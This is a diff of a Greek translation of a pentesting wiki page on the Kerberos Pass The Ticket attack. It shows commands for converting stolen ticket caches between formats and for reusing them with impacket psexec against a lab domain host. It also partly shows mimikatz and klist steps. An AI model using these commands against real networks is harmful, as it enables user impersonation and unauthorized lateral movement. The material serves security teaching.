@@ -4,16 +4,16 @@
 
 ## Pass The Ticket (PTT)
 
-Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το εισιτήριο αυθεντικοποίησης ενός χρήστη** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Αυτό το κλεμμένο εισιτήριο χρησιμοποιείται στη συνέχεια για να **παριστάνει τον χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες εντός ενός δικτύου.
+Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το authentication ticket ενός χρήστη** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Αυτό το κλεμμένο ticket χρησιμοποιείται στη συνέχεια για **την πλαστοπροσωπία του χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.<sup>[[1]](#references)</sup>
 
 **Διαβάστε**:
 
 - [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Swaping Linux and Windows tickets between platforms**
+### **Εναλλαγή Linux και Windows tickets μεταξύ πλατφορμών**
 
-Το εργαλείο [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) μετατρέπει τις μορφές εισιτηρίων χρησιμοποιώντας μόνο το ίδιο το εισιτήριο και ένα αρχείο εξόδου.
+Το εργαλείο [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) μετατρέπει μορφές ticket χρησιμοποιώντας μόνο το ίδιο το ticket και ένα αρχείο εξόδου.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -21,9 +21,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-Στα Windows, το [Kekeo](https://github.com/gentilkiwi/kekeo) μπορεί να χρησιμοποιηθεί.
+Στα Windows μπορεί να χρησιμοποιηθεί το [Kekeo](https://github.com/gentilkiwi/kekeo).
 
-### Επίθεση Pass The Ticket
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -38,6 +38,6 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 ```
 ## Αναφορές
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [1] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos;](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 {{#include ../../banners/hacktricks-training.md}}
